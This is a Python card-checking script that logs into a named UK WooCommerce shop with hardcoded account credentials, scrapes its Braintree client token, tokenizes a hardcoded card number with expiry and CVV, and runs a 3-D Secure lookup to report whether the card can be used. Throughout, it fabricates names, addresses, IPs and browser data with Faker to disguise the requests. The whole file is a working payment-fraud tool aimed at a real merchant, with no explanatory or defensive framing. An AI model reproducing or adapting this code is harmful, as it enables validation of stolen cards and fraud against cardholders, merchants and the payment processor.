import requests
import re
import random
import string
import base64
from user_agent import generate_user_agent
import cloudscraper
import uuid
from faker import Faker
c = '4569330531660583'
mm = '1'
ex = '27'
cvc = '135'
binmod = c[:6]
try:
    yy = ex[2] + ex[3]
    if '2' in ex[3] or '1' in ex[3]:
        yy = ex[2] + '7'
except:
    yy = ex[0] + ex[1]
    if '2' in ex[1] or '1' in ex[1]:
        yy = ex[0] + '7'

print(c, mm, yy, cvc)

characters = string.ascii_uppercase + string.digits
postal_code = ''.join(random.choices(characters, k=6))
user = generate_user_agent()
r = requests.session()
username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
email = f"{username}@gmail.com"
scraper = cloudscraper.create_scraper()
corr = str(uuid.uuid4())

# توليد رمز الدخول
headers = {
    'User-Agent': user,
}
rrr = scraper.get("https://beardedcolonel.co.uk/my-account/", headers=headers)
login = re.findall(r'name="woocommerce-login-nonce" value="(.*?)"', rrr.text)[0]

print(login)

headers = {
    'user-agent': user,
}
data = {
    'username': '6197kaylil@e-record.com',
    'password': '123bmS1234',
    'woocommerce-login-nonce': login,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'login': 'Log in',
}

response = scraper.post('https://beardedcolonel.co.uk/my-account/', headers=headers, data=data)

r = scraper.get('https://beardedcolonel.co.uk/my-account/add-payment-method/', headers=headers)

aut = r.text.split(r'var wc_braintree_client_token')[1].split('"')[1]
base4 = str(base64.b64decode(aut))
auth = base4.split('"authorizationFingerprint":')[1].split('"')[1]

print(auth)

fake = Faker('en_US')  # تحديد اللغة والمنطقة
full_name = f"{fake.first_name()} {fake.last_name()}"

headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': f'Bearer {auth}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}

json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': corr,
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {	 token	 creditCard {	   brandCode	   last4	   cardholderName	   expirationMonth	  expirationYear	  binData {		 prepaid		 healthcare		 debit		 durbinRegulated		 commercial		 payroll		 issuingBank		 countryOfIssuance		 productId	   }	 }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': c,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': fake.zipcode(),
                    'streetAddress': fake.street_address(),
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
tok = response.json()['data']['tokenizeCreditCard']['token']

def generate_random_numbers():
    numbers = f"{random.randint(400000, 599999):010d}"
    return numbers

random_numbers = generate_random_numbers()
print(random_numbers)

def generate_phone():
    numbers = f"{random.randint(1000000000, 9999999999):010d}"
    return numbers

phone_numbers = generate_phone()
print(phone_numbers)

headers = {
    'user-agent': user,
}

json_data = {
    'amount': random_numbers,
    'browserColorDepth': 24,
    'browserJavaEnabled': False,
    'browserJavascriptEnabled': True,
    'browserLanguage': 'ar-EG',
    'browserScreenHeight': random.randint(600, 1080),
    'browserScreenWidth': random.randint(300, 1920),
    'browserTimeZone': random.choice([-120, -60, 0, 60, 120]),
    'deviceChannel': 'Browser',
    'additionalInfo': {
        'ipAddress': fake.ipv4(),
        'billingLine1': fake.street_address(),
        'billingLine2': '',
        'billingCity': fake.city(),
        'billingState': fake.state_abbr(),
        'billingPostalCode': fake.postcode(),
        'billingCountryCode': fake.country_code(),
        'billingPhoneNumber': phone_numbers,
        'billingGivenName': fake.first_name(),
        'billingSurname': fake.last_name(),
        'email': email,
    },
    'bin': random_numbers,
    'dfReferenceId': f'1_{corr}',
    'clientMetadata': {
        'requestedThreeDSecureVersion': '3',
        'sdkVersion': 'web/3.106.0',
        'cardinalDeviceDataCollectionTimeElapsed': random.randint(100, 1000),
        'issuerDeviceDataCollectionTimeElapsed': random.randint(1000, 5000),
        'issuerDeviceDataCollectionResult': random.choice([True, False]),
    },
    'authorizationFingerprint': str(auth),
    'braintreeLibraryVersion': 'braintree/web/3.106.0',
    '_meta': {
        'merchantAppId': 'beardedcolonel.co.uk',
        'platform': 'web',
        'sdkVersion': '3.106.0',
        'source': 'client',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': fake.uuid4(),
    },
}

response = requests.post(
    f'https://api.braintreegateway.com/merchants/d96qc5y2r25zrtht/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
    headers=headers,
    json=json_data,
)

vbv = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
r.close()

if 'authenticate_successful' in vbv:
    print('3DS Authenticate Successful')
elif 'challenge_required' in vbv:
    print('3DS Challenge Required')
elif 'authenticate_attempt_successful' in vbv:
    print('3DS Authenticate Successful')
elif 'authenticate_rejected' in vbv:
    print('3DS Authenticate Rejected')
elif 'authenticate_frictionless_failed' in vbv:
    print('3DS Authenticate Frictionless Failed')
elif 'lookup_card_error' in vbv:
    print('lookup_card_error ⚠️')
elif 'lookup_error' in vbv:
    print('Unknown Error ⚠️')
else:
    print(vbv)
